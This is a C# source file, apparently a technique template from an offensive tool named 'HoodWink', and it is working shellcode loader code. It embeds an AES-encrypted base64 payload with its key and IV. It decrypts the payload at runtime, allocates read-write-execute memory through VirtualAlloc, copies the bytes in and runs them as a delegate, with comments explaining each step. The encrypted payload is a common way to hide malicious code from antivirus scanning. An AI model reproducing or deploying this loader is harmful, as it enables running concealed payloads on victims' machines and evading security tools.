// NOT Compiled

using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace HoodWink.TechniqueSource
{
    class Inline
    {
        // to allocate mem
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();

        public static void Main(string[] args)
        {
            string b64 = "S7SoQNzhzopgAy43qXppcgK747TYdbPn6K2TJBs8IzwUmKQJEYL9trSaTIpcZoSE3DvtewVQYw4rANJP5Q+A+dROo1qZoitVM1CSz0MY5iaTCyAErRb3KlDRk6CVA0x1FskF4PQ6ExV4sfbyCdTsTcFQePy9WZpFw+CeGkbuvep09e+MFLA62TxUWhcTAu5Ea/unoYNBM5MYp5VpXtXNbpn4vh+ZoJRNpKlP+2aZeQWwqV9ug79RKW6VG1RO/kVVKBKogVbY9nkdpXbD5prhZGgWUboOFi/WR/tXrGaxz8yAWO82nAuQKb8jWvTW+3cX6o3ZG187Sg1fb30e4PvtC+KscWOyXgVm+sIvWnDk5LgxOhRopYYpaJLel+qDeOey";
            string key = "fznj+qqPK3EB2cuSPSOWgCchNzGQX9Y7l+BdhDzuQEk=";
            string iv = "OSlpGb43/86qHsa4NQwwKA==";

            byte[] payload = Decrypt(b64, key, iv);

            // Debug
            // Console.WriteLine("Decrypted Size: " + payload.Length);
            // string hexPayload = BitConverter.ToString(payload);
            // Console.WriteLine("HexString: 0x" + hexPayload.Replace("-", ",0x"));

            // VirtualAlloc(zero to allocate memory at first viable location,
            //              amount of mem to allocate,
            //              magic value which maps to MEM_COMMIT in kernel32 it will allocate mem right away
            //              magic value which maps to RWX (read/write/execute) in kernel32
            //              )
            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);

            // Copy(byte array to copy to mem,
            //      index in byte array to begin copying at
            //      where to begin copying to
            //      how many bytes to copy            
            Marshal.Copy(payload, 0, ptr, payload.Length);

            // Convert unmanaged function pointer to a delegate
            // Marshal.GetDelegateForFunctionPointer Method(): https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=net-7.0
            WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));

            // Run 
            r();
        }


        private static byte[] Decrypt(string dataBase64, string keyBase64, string ivBase64)
        {
            using (Aes aes = Aes.Create())
            {
                // Decode data
                byte[] data = Convert.FromBase64String(dataBase64);

                // Set Key and IV
                aes.Key = Convert.FromBase64String(keyBase64);
                aes.IV = Convert.FromBase64String(ivBase64);

                // Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
                // Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
                // Console.WriteLine($"Aes Key Size :    {aes.KeySize}");
                // Console.WriteLine($"Aes Block Size :  {aes.BlockSize}");
                // Console.WriteLine();

                // Create decrypter and run
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return DoCrypto(data, decryptor);
                }
            }
        }

        // Do Encryption/Decryption on data with provided crypter
        private static byte[] DoCrypto(byte[] data, ICryptoTransform crypter)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, crypter, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();

                    return ms.ToArray();
                }
            }
        }

    }
}